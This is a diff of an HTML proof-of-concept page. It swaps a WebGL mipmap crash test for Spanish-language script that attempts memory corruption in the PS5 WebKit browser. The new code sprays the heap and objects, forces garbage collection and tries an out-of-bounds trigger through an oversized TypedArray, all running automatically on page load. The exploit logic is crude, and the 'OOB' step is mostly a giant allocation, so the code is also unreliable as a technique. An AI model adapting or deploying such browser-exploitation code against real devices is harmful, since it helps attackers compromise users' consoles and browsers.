@@ -1,54 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-  <title>WebGL1 Mipmap Crash PoC (PS5)</title>
-  <style>body { background: #000; color: lime; font-family: monospace; }</style>
+<meta charset="UTF-8" />
+<title>PoC Corrupción Memoria PS5 WebKit</title>
+<style>
+  body { background: #111; color: #eee; font-family: monospace; }
+  #log { white-space: pre-wrap; max-height: 300px; overflow-y: scroll; border: 1px solid #666; padding: 10px; }
+</style>
 </head>
 <body>
-  <h1>WebGL1 Mipmap Crash PoC</h1>
-  <p>Este test puede colapsar el navegador si es vulnerable.</p>
-  <script>
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl');
+<h1>PoC Corrupción Memoria PS5 WebKit</h1>
+<div id="log"></div>
 
-      if (!gl) {
-        document.body.innerHTML += "<p style='color:red'>WebGL1 no disponible</p>";
-        throw "WebGL1 no soportado.";
-      }
+<script>
+const log = document.getElementById('log');
+function debug(msg) {
+  log.textContent += msg + '\n';
+  log.scrollTop = log.scrollHeight;
+}
 
-      const texture = gl.createTexture();
-      gl.bindTexture(gl.TEXTURE_2D, texture);
+debug('Iniciando PoC agresivo para PS5 WebKit...\n');
 
-      const width = 1;
-      const height = 16384; // tamaño exagerado vertical
-      const data = new Uint8Array(width * height * 4); // RGBA
+function gc() {
+  // Forzar Garbage Collection (solo en motores que lo permitan)
+  for (let i = 0; i < 10000; i++) {
+    new ArrayBuffer(1024 * 1024);
+  }
+  debug('GC forzado.');
+}
 
-      // Forzamos una imagen 1x16384 para confundir el mipmapping
-      gl.texImage2D(
-        gl.TEXTURE_2D,
-        0,
-        gl.RGBA,
-        width,
-        height,
-        0,
-        gl.RGBA,
-        gl.UNSIGNED_BYTE,
-        data
-      );
+function heapGrooming() {
+  debug('Iniciando grooming heap...');
+  let arrays = [];
+  for (let i = 0; i < 1000; i++) {
+    let arr = new Uint8Array(1024);
+    for (let j = 0; j < arr.length; j++) arr[j] = 0x41;
+    arrays.push(arr);
+  }
+  debug('Heap grooming completado.');
+  return arrays;
+}
 
-      gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_LINEAR);
-      gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
+function oobTrigger() {
+  debug('Intentando provocar OOB con TypedArray...');
 
-      // 💣 Este generateMipmap puede causar crash si hay validación incorrecta
-      gl.generateMipmap(gl.TEXTURE_2D);
+  try {
+    // Este patrón intenta crear un TypedArray con longitud manipulada
+    // Puede provocar corrupción en motores vulnerables
+    let corruptLength = 0xffffffff;
+    let arr = new Uint8Array(corruptLength);
+    debug('TypedArray gigante creado (esto debería fallar normalmente).');
+  } catch(e) {
+    debug('Excepción al crear TypedArray gigante: ' + e.message);
+  }
+}
 
-      document.body.innerHTML += "<p style='color:lime'>Mipmap generado sin crash</p>";
+function sprayObjects() {
+  debug('Realizando spray de objetos para groom...');
+  let objs = [];
+  for (let i = 0; i < 10000; i++) {
+    objs.push({x:1.1, y:2.2, z:3.3});
+  }
+  debug('Spray de objetos completado.');
+  return objs;
+}
 
-    } catch (e) {
-      console.error(e);
-      document.body.innerHTML += `<p style='color:red'>Error: ${e}</p>`;
-    }
-  </script>
+function corruptMemory() {
+  debug('Ejecutando rutina agresiva para intentar corrupción...');
+
+  // Grooming
+  const groomedArrays = heapGrooming();
+
+  // Spray
+  const sprayedObjs = sprayObjects();
+
+  // Forzar GC para intentar mover objetos
+  gc();
+
+  // Intento de OOB
+  oobTrigger();
+
+  debug('Rutina finalizada. Si la consola no crashea, puede que no sea vulnerable.');
+}
+
+setTimeout(corruptMemory, 1000);
+</script>
 </body>
 </html>
